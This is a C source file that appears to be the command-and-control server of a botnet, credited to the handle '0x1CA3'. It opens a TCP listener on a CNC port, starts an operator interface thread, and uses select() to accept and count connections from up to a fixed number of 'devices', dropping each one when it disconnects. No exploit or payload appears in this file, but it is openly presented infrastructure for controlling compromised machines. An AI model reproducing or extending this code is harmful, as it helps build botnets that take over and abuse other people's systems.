#include "../../includes/server/server.h"
#include "../../includes/config/config.h"
#include "interface.c"
#pragma once


/*
    *    util/server/server.c
    *    Date: 11/09/21
    *    Author: 0x1CA3
*/


void c_server(int fd_user) {
    struct sockaddr_in cnc_server;
    for (i = 0; i < MAX_DEVICES; i++) {
        ccon[i] = 0;
    }
      
    s_fd = socket(AF_INET, SOCK_STREAM, 0);
    setsockopt(s_fd, SOL_SOCKET, SO_REUSEADDR, (char *)&nnum, sizeof(nnum));  

    cnc_server.sin_family = AF_INET;
    cnc_server.sin_addr.s_addr = INADDR_ANY;
    cnc_server.sin_port = htons(CNC_PORT);
      
    bind(s_fd, (struct sockaddr *)&cnc_server, sizeof(cnc_server));     
    listen(s_fd, 3);
    
    pthread_t thread_cli;
    pthread_create(&thread_cli, NULL, interface, fd_user);
    l = sizeof(cnc_server);

    while (1) {
        FD_ZERO(&fd_r);
        FD_SET(s_fd, &fd_r);
        max = s_fd;
         
        for (i = 0; i < MAX_DEVICES; i++) {
            d = ccon[i];             
            if (d > 0) {
                FD_SET(d, &fd_r);
            }
            if (d > max) {
                max = d;
            }
        }

        active = select(max + 1, &fd_r, NULL, NULL, NULL);
        if (FD_ISSET(s_fd, &fd_r)) {
            if ((sns = accept(s_fd, (struct sockaddr *)&cnc_server, (socklen_t *)&l)) < 0) {
                exit(EXIT_FAILURE);
            }              
            DEVICE_COUNT++;
            for (i = 0; i < MAX_DEVICES; i++) {
                if (ccon[i] == 0) {
                    ccon[i] = sns;
                    break;
                }
            }
        }
          
        for (i = 0; i < MAX_DEVICES; i++) {
            d = ccon[i];              
            if (FD_ISSET(d, &fd_r)) {
                if ((r_data = read(d, sb, 1024)) == 0) {
                    --DEVICE_COUNT;
                    close(d);
                    ccon[i] = 0;
                }                  
            }
        }
    }
}